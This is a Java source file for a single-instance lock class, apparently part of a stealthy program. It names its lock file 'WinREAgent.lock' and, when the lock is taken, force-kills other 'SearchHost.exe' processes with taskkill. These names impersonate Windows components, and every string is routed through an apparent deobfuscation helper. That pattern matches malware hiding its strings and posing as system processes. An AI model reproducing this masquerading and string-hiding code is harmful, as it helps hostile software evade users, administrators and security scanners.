package noface.host;

import noface.config.S;

import java.io.RandomAccessFile;
import java.nio.channels.FileChannel;
import java.nio.channels.FileLock;
import java.nio.file.Files;
import java.nio.file.Path;

public final class Lock {

    private static RandomAccessFile raf;
    private static FileChannel ch;
    private static FileLock fl;

    public static boolean hold() {
        if (grab()) return true;
        reap();
        return grab();
    }

    private static boolean grab() {
        try {
            Path dir = Path.of(System.getProperty("java.io.tmpdir"));
            Path f = dir.resolve(S.e("WinREAgent.lock"));
            Files.createDirectories(dir);
            raf = new RandomAccessFile(f.toFile(), "rw");
            ch = raf.getChannel();
            fl = ch.tryLock();
            return fl != null;
        } catch (Exception e) {
            release();
            return false;
        }
    }

    private static void reap() {
        try {
            new ProcessBuilder(
                    S.e("taskkill"),
                    S.e("/F"),
                    S.e("/IM"),
                    S.e("SearchHost.exe"),
                    S.e("/FI"),
                    S.e("PID ne ") + ProcessHandle.current().pid())
                    .redirectErrorStream(true)
                    .start()
                    .waitFor();
            Thread.sleep(400);
        } catch (Exception ignored) {
        }
    }

    public static void release() {
        try {
            if (fl != null) fl.release();
        } catch (Exception ignored) {
        }
        try {
            if (ch != null) ch.close();
        } catch (Exception ignored) {
        }
        try {
            if (raf != null) raf.close();
        } catch (Exception ignored) {
        }
        fl = null;
        ch = null;
        raf = null;
    }

    private Lock() {}
}
